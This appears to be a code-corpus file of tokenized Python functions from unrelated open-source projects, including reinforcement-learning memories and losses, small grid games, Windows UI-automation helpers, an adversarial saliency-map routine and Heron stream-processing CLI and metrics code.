def _move ( self , index , new_priority ) : item , old_priority = self . _memory [ index ] old_priority = old_priority or 0 self . _memory [ index ] = _SumRow ( item , new_priority ) self . _update_internal_nodes ( index , new_priority - old_priority )
def _next_position_then_increment ( self ) : start = self . _capacity - 1 position = start + self . _position self . _position = ( self . _position + 1 ) % self . _capacity return position
def _sample_with_priority ( self , p ) : parent = 0 while True : left = 2 * parent + 1 if left >= len ( self . _memory ) : # parent points to a leaf node already. return parent left_p = self . _memory [ left ] if left < self . _capacity - 1 else ( self . _memory [ left ] . priority or 0 ) if p <= left_p : parent = left else : if left + 1 >= len ( self . _memory ) : raise RuntimeError ( 'Right child is expected to exist.' ) p -= left_p parent = left + 1
def sample_minibatch ( self , batch_size ) : pool_size = len ( self ) if pool_size == 0 : return [ ] delta_p = self . _memory [ 0 ] / batch_size chosen_idx = [ ] # if all priorities sum to ~0  choose randomly otherwise random sample if abs ( self . _memory [ 0 ] ) < util . epsilon : chosen_idx = np . random . randint ( self . _capacity - 1 , self . _capacity - 1 + len ( self ) , size = batch_size ) . tolist ( ) else : for i in xrange ( batch_size ) : lower = max ( i * delta_p , 0 ) upper = min ( ( i + 1 ) * delta_p , self . _memory [ 0 ] ) p = random . uniform ( lower , upper ) chosen_idx . append ( self . _sample_with_priority ( p ) ) return [ ( i , self . _memory [ i ] ) for i in chosen_idx ]
def disconnect ( self ) : # If we are not connected, return error. if not self . socket : logging . warning ( "No active socket to close!" ) return # Close our socket. self . socket . close ( ) self . socket = None
def _is_action_available_left ( self , state ) : # True if any field is 0 (empty) on the left of a tile or two tiles can # be merged. for row in range ( 4 ) : has_empty = False for col in range ( 4 ) : has_empty |= state [ row , col ] == 0 if state [ row , col ] != 0 and has_empty : return True if ( state [ row , col ] != 0 and col > 0 and state [ row , col ] == state [ row , col - 1 ] ) : return True return False
def do_action ( self , action ) : temp_state = np . rot90 ( self . _state , action ) reward = self . _do_action_left ( temp_state ) self . _state = np . rot90 ( temp_state , - action ) self . _score += reward self . add_random_tile ( ) return reward
def _do_action_left ( self , state ) : reward = 0 for row in range ( 4 ) : # Always the rightmost tile in the current row that was already moved merge_candidate = - 1 merged = np . zeros ( ( 4 , ) , dtype = np . bool ) for col in range ( 4 ) : if state [ row , col ] == 0 : continue if ( merge_candidate != - 1 and not merged [ merge_candidate ] and state [ row , merge_candidate ] == state [ row , col ] ) : # Merge tile with merge_candidate state [ row , col ] = 0 merged [ merge_candidate ] = True state [ row , merge_candidate ] += 1 reward += 2 ** state [ row , merge_candidate ] else : # Move tile to the left merge_candidate += 1 if col != merge_candidate : state [ row , merge_candidate ] = state [ row , col ] state [ row , col ] = 0 return reward
def add_random_tile ( self ) : x_pos , y_pos = np . where ( self . _state == 0 ) assert len ( x_pos ) != 0 empty_index = np . random . choice ( len ( x_pos ) ) value = np . random . choice ( [ 1 , 2 ] , p = [ 0.9 , 0.1 ] ) self . _state [ x_pos [ empty_index ] , y_pos [ empty_index ] ] = value
def print_state ( self ) : def tile_string ( value ) : """Concert value to string.""" if value > 0 : return '% 5d' % ( 2 ** value , ) return "     " separator_line = '-' * 25 print ( separator_line ) for row in range ( 4 ) : print ( "|" + "|" . join ( [ tile_string ( v ) for v in self . _state [ row , : ] ] ) + "|" ) print ( separator_line )
def setup_saver ( self ) : if self . execution_type == "single" : global_variables = self . get_variables ( include_submodules = True , include_nontrainable = True ) else : global_variables = self . global_model . get_variables ( include_submodules = True , include_nontrainable = True ) # global_variables += [self.global_episode, self.global_timestep] for c in self . get_savable_components ( ) : c . register_saver_ops ( ) # TensorFlow saver object # TODO potentially make other options configurable via saver spec. self . saver = tf . train . Saver ( var_list = global_variables , # should be given? reshape = False , sharded = False , max_to_keep = 5 , keep_checkpoint_every_n_hours = 10000.0 , name = None , restore_sequentially = False , saver_def = None , builder = None , defer_build = False , allow_empty = True , write_version = tf . train . SaverDef . V2 , pad_step_number = False , save_relative_paths = True # filename=None )
def make_game ( ) : return ascii_art . ascii_art_to_game ( GAME_ART , what_lies_beneath = ' ' , sprites = dict ( [ ( 'P' , PlayerSprite ) ] + [ ( c , UpwardLaserBoltSprite ) for c in UPWARD_BOLT_CHARS ] + [ ( c , DownwardLaserBoltSprite ) for c in DOWNWARD_BOLT_CHARS ] ) , drapes = dict ( X = MarauderDrape , B = BunkerDrape ) , update_schedule = [ 'P' , 'B' , 'X' ] + list ( _ALL_BOLT_CHARS ) )
def _fly ( self , board , layers , things , the_plot ) : # Disappear if we've hit a Marauder or a bunker. if ( self . character in the_plot [ 'bunker_hitters' ] or self . character in the_plot [ 'marauder_hitters' ] ) : return self . _teleport ( ( - 1 , - 1 ) ) # Otherwise, northward! self . _north ( board , the_plot )
def _fire ( self , layers , things , the_plot ) : # We don't fire if the player fired another bolt just now. if the_plot . get ( 'last_player_shot' ) == the_plot . frame : return the_plot [ 'last_player_shot' ] = the_plot . frame # We start just above the player. row , col = things [ 'P' ] . position self . _teleport ( ( row - 1 , col ) )
def _fly ( self , board , layers , things , the_plot ) : # Disappear if we've hit a bunker. if self . character in the_plot [ 'bunker_hitters' ] : return self . _teleport ( ( - 1 , - 1 ) ) # End the game if we've hit the player. if self . position == things [ 'P' ] . position : the_plot . terminate_episode ( ) self . _south ( board , the_plot )
def _fire ( self , layers , the_plot ) : # We don't fire if another Marauder fired a bolt just now. if the_plot . get ( 'last_marauder_shot' ) == the_plot . frame : return the_plot [ 'last_marauder_shot' ] = the_plot . frame # Which Marauder should fire the laser bolt? col = np . random . choice ( np . nonzero ( layers [ 'X' ] . sum ( axis = 0 ) ) [ 0 ] ) row = np . nonzero ( layers [ 'X' ] [ : , col ] ) [ 0 ] [ - 1 ] + 1 # Move ourselves just below that Marauder. self . _teleport ( ( row , col ) )
def from_spec ( spec ) : exploration = util . get_object ( obj = spec , predefined_objects = tensorforce . core . explorations . explorations ) assert isinstance ( exploration , Exploration ) return exploration
def from_spec ( spec , kwargs = None ) : memory = util . get_object ( obj = spec , predefined_objects = tensorforce . core . memories . memories , kwargs = kwargs ) assert isinstance ( memory , Memory ) return memory
def parse_lheading ( self , m ) : self . tokens . append ( { 'type' : 'heading' , 'level' : 1 if m . group ( 2 ) == '=' else 2 , 'text' : m . group ( 1 ) , } )
def process_docstring ( app , what , name , obj , options , lines ) : markdown = "\n" . join ( lines ) # ast = cm_parser.parse(markdown) # html = cm_renderer.render(ast) rest = m2r ( markdown ) rest . replace ( "\r\n" , "\n" ) del lines [ : ] lines . extend ( rest . split ( "\n" ) )
def setup_components_and_tf_funcs ( self , custom_getter = None ) : custom_getter = super ( QDemoModel , self ) . setup_components_and_tf_funcs ( custom_getter ) self . demo_memory = Replay ( states = self . states_spec , internals = self . internals_spec , actions = self . actions_spec , include_next_states = True , capacity = self . demo_memory_capacity , scope = 'demo-replay' , summary_labels = self . summary_labels ) # Import demonstration optimization. self . fn_import_demo_experience = tf . make_template ( name_ = 'import-demo-experience' , func_ = self . tf_import_demo_experience , custom_getter_ = custom_getter ) # Demonstration loss. self . fn_demo_loss = tf . make_template ( name_ = 'demo-loss' , func_ = self . tf_demo_loss , custom_getter_ = custom_getter ) # Combined loss. self . fn_combined_loss = tf . make_template ( name_ = 'combined-loss' , func_ = self . tf_combined_loss , custom_getter_ = custom_getter ) # Demonstration optimization. self . fn_demo_optimization = tf . make_template ( name_ = 'demo-optimization' , func_ = self . tf_demo_optimization , custom_getter_ = custom_getter ) return custom_getter
def tf_import_demo_experience ( self , states , internals , actions , terminal , reward ) : return self . demo_memory . store ( states = states , internals = internals , actions = actions , terminal = terminal , reward = reward )
def tf_demo_loss ( self , states , actions , terminal , reward , internals , update , reference = None ) : embedding = self . network . apply ( x = states , internals = internals , update = update ) deltas = list ( ) for name in sorted ( actions ) : action = actions [ name ] distr_params = self . distributions [ name ] . parameterize ( x = embedding ) state_action_value = self . distributions [ name ] . state_action_value ( distr_params = distr_params , action = action ) # Create the supervised margin loss # Zero for the action taken, one for all other actions, now multiply by expert margin if self . actions_spec [ name ] [ 'type' ] == 'bool' : num_actions = 2 action = tf . cast ( x = action , dtype = util . tf_dtype ( 'int' ) ) else : num_actions = self . actions_spec [ name ] [ 'num_actions' ] one_hot = tf . one_hot ( indices = action , depth = num_actions ) ones = tf . ones_like ( tensor = one_hot , dtype = tf . float32 ) inverted_one_hot = ones - one_hot # max_a([Q(s,a) + l(s,a_E,a)], l(s,a_E, a) is 0 for expert action and margin value for others state_action_values = self . distributions [ name ] . state_action_value ( distr_params = distr_params ) state_action_values = state_action_values + inverted_one_hot * self . expert_margin supervised_selector = tf . reduce_max ( input_tensor = state_action_values , axis = - 1 ) # J_E(Q) = max_a([Q(s,a) + l(s,a_E,a)] - Q(s,a_E) delta = supervised_selector - state_action_value action_size = util . prod ( self . actions_spec [ name ] [ 'shape' ] ) delta = tf . reshape ( tensor = delta , shape = ( - 1 , action_size ) ) deltas . append ( delta ) loss_per_instance = tf . reduce_mean ( input_tensor = tf . concat ( values = deltas , axis = 1 ) , axis = 1 ) loss_per_instance = tf . square ( x = loss_per_instance ) return tf . reduce_mean ( input_tensor = loss_per_instance , axis = 0 )
def tf_combined_loss ( self , states , internals , actions , terminal , reward , next_states , next_internals , update , reference = None ) : q_model_loss = self . fn_loss ( states = states , internals = internals , actions = actions , terminal = terminal , reward = reward , next_states = next_states , next_internals = next_internals , update = update , reference = reference ) demo_loss = self . fn_demo_loss ( states = states , internals = internals , actions = actions , terminal = terminal , reward = reward , update = update , reference = reference ) return q_model_loss + self . supervised_weight * demo_loss
def import_demo_experience ( self , states , internals , actions , terminal , reward ) : fetches = self . import_demo_experience_output feed_dict = self . get_feed_dict ( states = states , internals = internals , actions = actions , terminal = terminal , reward = reward ) self . monitored_session . run ( fetches = fetches , feed_dict = feed_dict )
def from_config ( config , kwargs = None ) : return util . get_object ( obj = config , predefined = tensorforce . core . optimizers . solvers . solvers , kwargs = kwargs )
def SetClipboardText ( text : str ) -> bool : if ctypes . windll . user32 . OpenClipboard ( 0 ) : ctypes . windll . user32 . EmptyClipboard ( ) textByteLen = ( len ( text ) + 1 ) * 2 hClipboardData = ctypes . windll . kernel32 . GlobalAlloc ( 0 , textByteLen ) # GMEM_FIXED=0 hDestText = ctypes . windll . kernel32 . GlobalLock ( hClipboardData ) ctypes . cdll . msvcrt . wcsncpy ( ctypes . c_wchar_p ( hDestText ) , ctypes . c_wchar_p ( text ) , textByteLen // 2 ) ctypes . windll . kernel32 . GlobalUnlock ( hClipboardData ) # system owns hClipboardData after calling SetClipboardData, # application can not write to or free the data once ownership has been transferred to the system ctypes . windll . user32 . SetClipboardData ( 13 , hClipboardData ) # CF_TEXT=1, CF_UNICODETEXT=13 ctypes . windll . user32 . CloseClipboard ( ) return True return False
def mouse_event ( dwFlags : int , dx : int , dy : int , dwData : int , dwExtraInfo : int ) -> None : ctypes . windll . user32 . mouse_event ( dwFlags , dx , dy , dwData , dwExtraInfo )
def keybd_event ( bVk : int , bScan : int , dwFlags : int , dwExtraInfo : int ) -> None : ctypes . windll . user32 . keybd_event ( bVk , bScan , dwFlags , dwExtraInfo )
def KeyboardInput ( wVk : int , wScan : int , dwFlags : int = KeyboardEventFlag . KeyDown , time_ : int = 0 ) -> INPUT : return _CreateInput ( KEYBDINPUT ( wVk , wScan , dwFlags , time_ , None ) )
def HardwareInput ( uMsg : int , param : int = 0 ) -> INPUT : return _CreateInput ( HARDWAREINPUT ( uMsg , param & 0xFFFF , param >> 16 & 0xFFFF ) )
def DeleteLog ( ) -> None : if os . path . exists ( Logger . FileName ) : os . remove ( Logger . FileName )
def GetAllPixelColors ( self ) -> ctypes . Array : return self . GetPixelColorsOfRect ( 0 , 0 , self . Width , self . Height )
def GetParentControl ( self ) -> 'Control' : ele = _AutomationClient . instance ( ) . ViewWalker . GetParentElement ( self . Element ) return Control . CreateControlFromElement ( ele )
def GetFirstChildControl ( self ) -> 'Control' : ele = _AutomationClient . instance ( ) . ViewWalker . GetFirstChildElement ( self . Element ) return Control . CreateControlFromElement ( ele )
def GetLastChildControl ( self ) -> 'Control' : ele = _AutomationClient . instance ( ) . ViewWalker . GetLastChildElement ( self . Element ) return Control . CreateControlFromElement ( ele )
def GetNextSiblingControl ( self ) -> 'Control' : ele = _AutomationClient . instance ( ) . ViewWalker . GetNextSiblingElement ( self . Element ) return Control . CreateControlFromElement ( ele )
def GetPreviousSiblingControl ( self ) -> 'Control' : ele = _AutomationClient . instance ( ) . ViewWalker . GetPreviousSiblingElement ( self . Element ) return Control . CreateControlFromElement ( ele )
def GetChildren ( self ) -> list : children = [ ] child = self . GetFirstChildControl ( ) while child : children . append ( child ) child = child . GetNextSiblingControl ( ) return children
def SetWindowText ( self , text : str ) -> bool : handle = self . NativeWindowHandle if handle : return SetWindowText ( handle , text ) return False
def IsTopLevel ( self ) -> bool : handle = self . NativeWindowHandle if handle : return GetAncestor ( handle , GAFlag . Root ) == handle return False
def Maximize ( self , waitTime : float = OPERATION_WAIT_TIME ) -> bool : if self . IsTopLevel ( ) : return self . ShowWindow ( SW . ShowMaximized , waitTime ) return False
def MoveToCenter ( self ) -> bool : if self . IsTopLevel ( ) : rect = self . BoundingRectangle screenWidth , screenHeight = GetScreenSize ( ) x , y = ( screenWidth - rect . width ( ) ) // 2 , ( screenHeight - rect . height ( ) ) // 2 if x < 0 : x = 0 if y < 0 : y = 0 return SetWindowPos ( self . NativeWindowHandle , SWP . HWND_Top , x , y , 0 , 0 , SWP . SWP_NoSize ) return False
def SetActive ( self , waitTime : float = OPERATION_WAIT_TIME ) -> bool : if self . IsTopLevel ( ) : handle = self . NativeWindowHandle if IsIconic ( handle ) : ret = ShowWindow ( handle , SW . Restore ) elif not IsWindowVisible ( handle ) : ret = ShowWindow ( handle , SW . Show ) ret = SetForegroundWindow ( handle ) # may fail if foreground windows's process is not python time . sleep ( waitTime ) return ret return False
def _saliency_map ( self , a , image , target , labels , mask , fast = False ) : # pixel influence on target class alphas = a . gradient ( image , target ) * mask # pixel influence on sum of residual classes # (don't evaluate if fast == True) if fast : betas = - np . ones_like ( alphas ) else : betas = np . sum ( [ a . gradient ( image , label ) * mask - alphas for label in labels ] , 0 ) # compute saliency map # (take into account both pos. & neg. perturbations) salmap = np . abs ( alphas ) * np . abs ( betas ) * np . sign ( alphas * betas ) # find optimal pixel & direction of perturbation idx = np . argmin ( salmap ) idx = np . unravel_index ( idx , mask . shape ) pix_sign = np . sign ( alphas ) [ idx ] return idx , pix_sign
def _get_output ( self , a , image ) : sd = np . square ( self . _input_images - image ) mses = np . mean ( sd , axis = tuple ( range ( 1 , sd . ndim ) ) ) index = np . argmin ( mses ) # if we run into numerical problems with this approach, we might # need to add a very tiny threshold here if mses [ index ] > 0 : raise ValueError ( 'No precomputed output image for this image' ) return self . _output_images [ index ]
def write_error_response ( self , message ) : self . set_status ( 404 ) response = self . make_error_response ( str ( message ) ) now = time . time ( ) spent = now - self . basehandler_starttime response [ constants . RESPONSE_KEY_EXECUTION_TIME ] = spent self . write_json_response ( response )
def write_json_response ( self , response ) : self . write ( tornado . escape . json_encode ( response ) ) self . set_header ( "Content-Type" , "application/json" )
def create_tar ( tar_filename , files , config_dir , config_files ) : with contextlib . closing ( tarfile . open ( tar_filename , 'w:gz' , dereference = True ) ) as tar : for filename in files : if os . path . isfile ( filename ) : tar . add ( filename , arcname = os . path . basename ( filename ) ) else : raise Exception ( "%s is not an existing file" % filename ) if os . path . isdir ( config_dir ) : tar . add ( config_dir , arcname = get_heron_sandbox_conf_dir ( ) ) else : raise Exception ( "%s is not an existing directory" % config_dir ) for filename in config_files : if os . path . isfile ( filename ) : arcfile = os . path . join ( get_heron_sandbox_conf_dir ( ) , os . path . basename ( filename ) ) tar . add ( filename , arcname = arcfile ) else : raise Exception ( "%s is not an existing file" % filename )
def get_subparser ( parser , command ) : # pylint: disable=protected-access subparsers_actions = [ action for action in parser . _actions if isinstance ( action , argparse . _SubParsersAction ) ] # there will probably only be one subparser_action, # but better save than sorry for subparsers_action in subparsers_actions : # get all subparsers for choice , subparser in subparsers_action . choices . items ( ) : if choice == command : return subparser return None
def get_heron_libs ( local_jars ) : heron_lib_dir = get_heron_lib_dir ( ) heron_libs = [ os . path . join ( heron_lib_dir , f ) for f in local_jars ] return heron_libs
def parse_override_config ( namespace ) : overrides = dict ( ) for config in namespace : kv = config . split ( "=" ) if len ( kv ) != 2 : raise Exception ( "Invalid config property format (%s) expected key=value" % config ) if kv [ 1 ] in [ 'true' , 'True' , 'TRUE' ] : overrides [ kv [ 0 ] ] = True elif kv [ 1 ] in [ 'false' , 'False' , 'FALSE' ] : overrides [ kv [ 0 ] ] = False else : overrides [ kv [ 0 ] ] = kv [ 1 ] return overrides
def get_java_path ( ) : java_home = os . environ . get ( "JAVA_HOME" ) return os . path . join ( java_home , BIN_DIR , "java" )
def check_java_home_set ( ) : # check if environ variable is set if "JAVA_HOME" not in os . environ : Log . error ( "JAVA_HOME not set" ) return False # check if the value set is correct java_path = get_java_path ( ) if os . path . isfile ( java_path ) and os . access ( java_path , os . X_OK ) : return True Log . error ( "JAVA_HOME/bin/java either does not exist or not an executable" ) return False
def check_release_file_exists ( ) : release_file = get_heron_release_file ( ) # if the file does not exist and is not a file if not os . path . isfile ( release_file ) : Log . error ( "Required file not found: %s" % release_file ) return False return True
def unregister_watch ( self , uid ) : # Do not raise an error if UUID is # not present in the watches. Log . info ( "Unregister a watch with uid: " + str ( uid ) ) self . watches . pop ( uid , None )
def num_instances ( self ) : num = 0 # Get all the components components = self . spouts ( ) + self . bolts ( ) # Get instances for each worker for component in components : config = component . comp . config for kvs in config . kvs : if kvs . key == api_constants . TOPOLOGY_COMPONENT_PARALLELISM : num += int ( kvs . value ) break return num
def convert_pb_kvs ( kvs , include_non_primitives = True ) : config = { } for kv in kvs : if kv . value : config [ kv . key ] = kv . value elif kv . serialized_value : # add serialized_value support for python values (fixme) # is this a serialized java object if topology_pb2 . JAVA_SERIALIZED_VALUE == kv . type : jv = _convert_java_value ( kv , include_non_primitives = include_non_primitives ) if jv is not None : config [ kv . key ] = jv else : config [ kv . key ] = _raw_value ( kv ) return config
def synch_topologies ( self ) : self . state_managers = statemanagerfactory . get_all_state_managers ( self . config . statemgr_config ) try : for state_manager in self . state_managers : state_manager . start ( ) except Exception as ex : Log . error ( "Found exception while initializing state managers: %s. Bailing out..." % ex ) traceback . print_exc ( ) sys . exit ( 1 ) # pylint: disable=deprecated-lambda def on_topologies_watch ( state_manager , topologies ) : """watch topologies""" Log . info ( "State watch triggered for topologies." ) Log . debug ( "Topologies: " + str ( topologies ) ) existingTopologies = self . getTopologiesForStateLocation ( state_manager . name ) existingTopNames = map ( lambda t : t . name , existingTopologies ) Log . debug ( "Existing topologies: " + str ( existingTopNames ) ) for name in existingTopNames : if name not in topologies : Log . info ( "Removing topology: %s in rootpath: %s" , name , state_manager . rootpath ) self . removeTopology ( name , state_manager . name ) for name in topologies : if name not in existingTopNames : self . addNewTopology ( state_manager , name ) for state_manager in self . state_managers : # The callback function with the bound # state_manager as first variable. onTopologiesWatch = partial ( on_topologies_watch , state_manager ) state_manager . get_topologies ( onTopologiesWatch )
def getTopologiesForStateLocation ( self , name ) : return filter ( lambda t : t . state_manager_name == name , self . topologies )
def removeTopology ( self , topology_name , state_manager_name ) : topologies = [ ] for top in self . topologies : if ( top . name == topology_name and top . state_manager_name == state_manager_name ) : # Remove topologyInfo if ( topology_name , state_manager_name ) in self . topologyInfos : self . topologyInfos . pop ( ( topology_name , state_manager_name ) ) else : topologies . append ( top ) self . topologies = topologies
def validated_formatter ( self , url_format ) : # We try to create a string by substituting all known # parameters. If an unknown parameter is present, an error # will be thrown valid_parameters = { "${CLUSTER}" : "cluster" , "${ENVIRON}" : "environ" , "${TOPOLOGY}" : "topology" , "${ROLE}" : "role" , "${USER}" : "user" , } dummy_formatted_url = url_format for key , value in valid_parameters . items ( ) : dummy_formatted_url = dummy_formatted_url . replace ( key , value ) # All $ signs must have been replaced if '$' in dummy_formatted_url : raise Exception ( "Invalid viz.url.format: %s" % ( url_format ) ) # No error is thrown, so the format is valid. return url_format
def to_table ( components , topo_info ) : inputs , outputs = defaultdict ( list ) , defaultdict ( list ) for ctype , component in components . items ( ) : if ctype == 'bolts' : for component_name , component_info in component . items ( ) : for input_stream in component_info [ 'inputs' ] : input_name = input_stream [ 'component_name' ] inputs [ component_name ] . append ( input_name ) outputs [ input_name ] . append ( component_name ) info = [ ] spouts_instance = topo_info [ 'physical_plan' ] [ 'spouts' ] bolts_instance = topo_info [ 'physical_plan' ] [ 'bolts' ] for ctype , component in components . items ( ) : # stages is an int so keep going if ctype == "stages" : continue for component_name , component_info in component . items ( ) : row = [ ctype [ : - 1 ] , component_name ] if ctype == 'spouts' : row . append ( len ( spouts_instance [ component_name ] ) ) else : row . append ( len ( bolts_instance [ component_name ] ) ) row . append ( ',' . join ( inputs . get ( component_name , [ '-' ] ) ) ) row . append ( ',' . join ( outputs . get ( component_name , [ '-' ] ) ) ) info . append ( row ) header = [ 'type' , 'name' , 'parallelism' , 'input' , 'output' ] return info , header
def filter_bolts ( table , header ) : bolts_info = [ ] for row in table : if row [ 0 ] == 'bolt' : bolts_info . append ( row ) return bolts_info , header
def filter_spouts ( table , header ) : spouts_info = [ ] for row in table : if row [ 0 ] == 'spout' : spouts_info . append ( row ) return spouts_info , header
def validate_state_locations ( self ) : names = map ( lambda loc : loc [ "name" ] , self . locations ) assert len ( names ) == len ( set ( names ) ) , "Names of state locations must be unique"
def initialize ( self , config , context ) : self . logger . info ( "Initializing PulsarSpout with the following" ) self . logger . info ( "Component-specific config: \n%s" % str ( config ) ) self . logger . info ( "Context: \n%s" % str ( context ) ) self . emit_count = 0 self . ack_count = 0 self . fail_count = 0 if not PulsarSpout . serviceUrl in config or not PulsarSpout . topicName in config : self . logger . fatal ( "Need to specify both serviceUrl and topicName" ) self . pulsar_cluster = str ( config [ PulsarSpout . serviceUrl ] ) self . topic = str ( config [ PulsarSpout . topicName ] ) mode = config [ api_constants . TOPOLOGY_RELIABILITY_MODE ] if mode == api_constants . TopologyReliabilityMode . ATLEAST_ONCE : self . acking_timeout = 1000 * int ( config [ api_constants . TOPOLOGY_MESSAGE_TIMEOUT_SECS ] ) else : self . acking_timeout = 30000 if PulsarSpout . receiveTimeoutMs in config : self . receive_timeout_ms = config [ PulsarSpout . receiveTimeoutMs ] else : self . receive_timeout_ms = 10 if PulsarSpout . deserializer in config : self . deserializer = config [ PulsarSpout . deserializer ] if not callable ( self . deserializer ) : self . logger . fatal ( "Pulsar Message Deserializer needs to be callable" ) else : self . deserializer = self . default_deserializer # First generate the config self . logConfFileName = GenerateLogConfig ( context ) self . logger . info ( "Generated LogConf at %s" % self . logConfFileName ) # We currently use the high level consumer API # For supporting effectively once, we will need to switch # to using lower level Reader API, when it becomes # available in python self . client = pulsar . Client ( self . pulsar_cluster , log_conf_file_path = self . logConfFileName ) self . logger . info ( "Setup Client with cluster %s" % self . pulsar_cluster ) try : self . consumer = self . client . subscribe ( self . topic , context . get_topology_name ( ) , consumer_type = pulsar . ConsumerType . Failover , unacked_messages_timeout_ms = self . acking_timeout ) except Exception as e : self . logger . fatal ( "Pulsar client subscription failed: %s" % str ( e ) ) self . logger . info ( "Subscribed to topic %s" % self . topic )
def getInstanceJstack ( self , topology_info , instance_id ) : pid_response = yield getInstancePid ( topology_info , instance_id ) try : http_client = tornado . httpclient . AsyncHTTPClient ( ) pid_json = json . loads ( pid_response ) pid = pid_json [ 'stdout' ] . strip ( ) if pid == '' : raise Exception ( 'Failed to get pid' ) endpoint = utils . make_shell_endpoint ( topology_info , instance_id ) url = "%s/jstack/%s" % ( endpoint , pid ) response = yield http_client . fetch ( url ) Log . debug ( "HTTP call for url: %s" , url ) raise tornado . gen . Return ( response . body ) except tornado . httpclient . HTTPError as e : raise Exception ( str ( e ) )
def create_parser ( subparsers ) : parser = subparsers . add_parser ( 'update' , help = 'Update a topology' , usage = "%(prog)s [options] cluster/[role]/[env] <topology-name> " + "[--component-parallelism <name:value>] " + "[--container-number value] " + "[--runtime-config [component:]<name:value>]" , add_help = True ) args . add_titles ( parser ) args . add_cluster_role_env ( parser ) args . add_topology ( parser ) args . add_config ( parser ) args . add_dry_run ( parser ) args . add_service_url ( parser ) args . add_verbose ( parser ) # Special parameters for update command def parallelism_type ( value ) : pattern = re . compile ( r"^[\w\.-]+:[\d]+$" ) if not pattern . match ( value ) : raise argparse . ArgumentTypeError ( "Invalid syntax for component parallelism (<component_name:value>): %s" % value ) return value parser . add_argument ( '--component-parallelism' , action = 'append' , type = parallelism_type , required = False , help = 'Component name and the new parallelism value ' + 'colon-delimited: <component_name>:<parallelism>' ) def runtime_config_type ( value ) : pattern = re . compile ( r"^([\w\.-]+:){1,2}[\w\.-]+$" ) if not pattern . match ( value ) : raise argparse . ArgumentTypeError ( "Invalid syntax for runtime config ([component:]<name:value>): %s" % value ) return value parser . add_argument ( '--runtime-config' , action = 'append' , type = runtime_config_type , required = False , help = 'Runtime configurations for topology and components ' + 'colon-delimited: [component:]<name>:<value>' ) def container_number_type ( value ) : pattern = re . compile ( r"^\d+$" ) if not pattern . match ( value ) : raise argparse . ArgumentTypeError ( "Invalid syntax for container number (value): %s" % value ) return value parser . add_argument ( '--container-number' , action = 'append' , type = container_number_type , required = False , help = 'Number of containers <value>' ) parser . set_defaults ( subcommand = 'update' ) return parser
def build_extra_args_dict ( cl_args ) : # Check parameters component_parallelism = cl_args [ 'component_parallelism' ] runtime_configs = cl_args [ 'runtime_config' ] container_number = cl_args [ 'container_number' ] # Users need to provide either (component-parallelism || container_number) or runtime-config if ( component_parallelism and runtime_configs ) or ( container_number and runtime_configs ) : raise Exception ( "(component-parallelism or container_num) and runtime-config " + "can't be updated at the same time" ) dict_extra_args = { } nothing_set = True if component_parallelism : dict_extra_args . update ( { 'component_parallelism' : component_parallelism } ) nothing_set = False if container_number : dict_extra_args . update ( { 'container_number' : container_number } ) nothing_set = False if runtime_configs : dict_extra_args . update ( { 'runtime_config' : runtime_configs } ) nothing_set = False if nothing_set : raise Exception ( "Missing arguments --component-parallelism or --runtime-config or --container-number" ) if cl_args [ 'dry_run' ] : dict_extra_args . update ( { 'dry_run' : True } ) if 'dry_run_format' in cl_args : dict_extra_args . update ( { 'dry_run_format' : cl_args [ "dry_run_format" ] } ) return dict_extra_args
def run ( command , parser , cl_args , unknown_args ) : Log . debug ( "Update Args: %s" , cl_args ) # Build jar list extra_lib_jars = jars . packing_jars ( ) action = "update topology%s" % ( ' in dry-run mode' if cl_args [ "dry_run" ] else '' ) # Build extra args dict_extra_args = { } try : dict_extra_args = build_extra_args_dict ( cl_args ) except Exception as err : return SimpleResult ( Status . InvocationError , err . message ) # Execute if cl_args [ 'deploy_mode' ] == config . SERVER_MODE : return cli_helper . run_server ( command , cl_args , action , dict_extra_args ) else : # Convert extra argument to commandline format and then execute list_extra_args = convert_args_dict_to_list ( dict_extra_args ) return cli_helper . run_direct ( command , cl_args , action , list_extra_args , extra_lib_jars )
def is_grouping_sane ( cls , gtype ) : if gtype == cls . SHUFFLE or gtype == cls . ALL or gtype == cls . LOWEST or gtype == cls . NONE : return True elif isinstance ( gtype , cls . FIELDS ) : return gtype . gtype == topology_pb2 . Grouping . Value ( "FIELDS" ) and gtype . fields is not None elif isinstance ( gtype , cls . CUSTOM ) : return gtype . gtype == topology_pb2 . Grouping . Value ( "CUSTOM" ) and gtype . python_serialized is not None else : #pylint: disable=fixme #TODO: DIRECT are not supported yet return False
def register_metrics ( self , metrics_collector , interval ) : for field , metrics in self . metrics . items ( ) : metrics_collector . register_metric ( field , metrics , interval )
def update_received_packet ( self , received_pkt_size_bytes ) : self . update_count ( self . RECEIVED_PKT_COUNT ) self . update_count ( self . RECEIVED_PKT_SIZE , incr_by = received_pkt_size_bytes )
def update_sent_packet ( self , sent_pkt_size_bytes ) : self . update_count ( self . SENT_PKT_COUNT ) self . update_count ( self . SENT_PKT_SIZE , incr_by = sent_pkt_size_bytes )
def serialize_data_tuple ( self , stream_id , latency_in_ns ) : self . update_count ( self . TUPLE_SERIALIZATION_TIME_NS , incr_by = latency_in_ns , key = stream_id )
def _init_multi_count_metrics ( self , pplan_helper ) : to_init = [ self . metrics [ i ] for i in self . to_multi_init if i in self . metrics and isinstance ( self . metrics [ i ] , MultiCountMetric ) ] for out_stream in pplan_helper . get_my_spout ( ) . outputs : stream_id = out_stream . stream . id for metric in to_init : metric . add_key ( stream_id )
def next_tuple ( self , latency_in_ns ) : self . update_reduced_metric ( self . NEXT_TUPLE_LATENCY , latency_in_ns ) self . update_count ( self . NEXT_TUPLE_COUNT )
def acked_tuple ( self , stream_id , complete_latency_ns ) : self . update_count ( self . ACK_COUNT , key = stream_id ) self . update_reduced_metric ( self . COMPLETE_LATENCY , complete_latency_ns , key = stream_id )
def failed_tuple ( self , stream_id , fail_latency_ns ) : self . update_count ( self . FAIL_COUNT , key = stream_id ) self . update_reduced_metric ( self . FAIL_LATENCY , fail_latency_ns , key = stream_id )
def _init_multi_count_metrics ( self , pplan_helper ) : # inputs to_in_init = [ self . metrics [ i ] for i in self . inputs_init if i in self . metrics and isinstance ( self . metrics [ i ] , MultiCountMetric ) ] for in_stream in pplan_helper . get_my_bolt ( ) . inputs : stream_id = in_stream . stream . id global_stream_id = in_stream . stream . component_name + "/" + stream_id for metric in to_in_init : metric . add_key ( stream_id ) metric . add_key ( global_stream_id ) # outputs to_out_init = [ self . metrics [ i ] for i in self . outputs_init if i in self . metrics and isinstance ( self . metrics [ i ] , MultiCountMetric ) ] for out_stream in pplan_helper . get_my_bolt ( ) . outputs : stream_id = out_stream . stream . id for metric in to_out_init : metric . add_key ( stream_id )
